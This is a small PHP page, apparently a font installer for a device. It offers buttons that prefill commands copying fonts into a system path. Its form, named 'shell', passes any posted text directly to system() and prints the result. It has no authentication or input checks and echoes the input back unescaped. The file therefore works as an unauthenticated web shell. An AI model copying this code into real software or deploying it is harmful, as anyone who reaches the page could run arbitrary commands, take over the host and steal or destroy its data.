<?php

$dir = @ dir("guifont/");

while (($file = $dir->read()) !== false)
  {
  if ($file <> ".") if ($file <> "..")
  $menu[$file] = "cp guifont/$file /usr/local/bin/Resource/cwheib.ttf";
	
  }

$dir->close();
@exec("uname -a", $uname);
?>

<style type="text/css">

span {
text-decoration: none;
padding: 2px 4px;
margin: 3px;
font-family: Arial, Helvetica, sans-serif;
font-size: 85%;
color: #900;
background-color: #BBB;
cursor: pointer;
}

</style>

<table border=0 cellspacing=0 cellpadding=0>
<form name=shell method=post action="?page=fontinstaller.php">
	<tr>
		<td><? $counter = count($menu); foreach ($menu as $k => $v) { echo "<span onclick=\"document.shell.cmd.value='".$v."';document.shell.cmd.focus();\">".$k."</span>"; $counter--; } ?></td>
	</tr>
	<tr>
		<td><pre># <input type=text name=cmd size=110 value="<? if(isset($_POST[cmd])){echo $cmd;} ?>"><script> document.shell.cmd.focus(); </script></pre></td>
	</tr>
	<tr>
		<td><pre><? if (!empty($_POST[cmd])) system($_POST[cmd]); ?></pre></td>
	</tr>

</form>

</table>

